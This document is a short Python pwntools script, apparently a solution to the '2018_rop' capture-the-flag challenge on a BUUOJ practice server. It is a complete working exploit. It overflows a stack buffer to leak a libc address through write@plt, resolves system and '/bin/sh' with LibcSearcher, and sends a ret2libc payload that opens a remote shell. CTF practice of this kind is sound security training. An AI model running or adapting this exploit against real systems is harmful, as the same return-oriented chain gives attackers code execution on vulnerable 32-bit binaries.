#!/usr/bin/python3.6
from pwn import *
from LibcSearcher import LibcSearcher


filename = './2018_rop'
e = ELF(filename)
# p = process(filename)
p = remote("node3.buuoj.cn", 27189)

vuln = e.sym['vulnerable_function']
write_plt, start_got = e.plt['write'], e.got['__libc_start_main']
log.info(f'write:plt={hex(write_plt)}, __libc_start_main:got={hex(start_got)}')

ra_offset = 0x88 + 4 
payload_leak = b'1' * ra_offset + p32(write_plt) + p32(vuln) + p32(1) + p32(start_got) + p32(4)

p.sendline(payload_leak)

start_addr = u32(p.recv(numb=4).ljust(4, b'\x00'))
log.success(f'start:{hex(start_addr)}')

searcher = LibcSearcher()
searcher.add_condition('__libc_start_main', start_addr)
base_addr = start_addr - searcher.dump('__libc_start_main')
system_addr = base_addr + searcher.dump('system')
bin_sh_addr = base_addr + searcher.dump('str_bin_sh')

log.info(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
payload = b'2' * ra_offset + p32(system_addr) + p32(vuln) + p32(bin_sh_addr)
p.sendline(payload)
p.interactive()
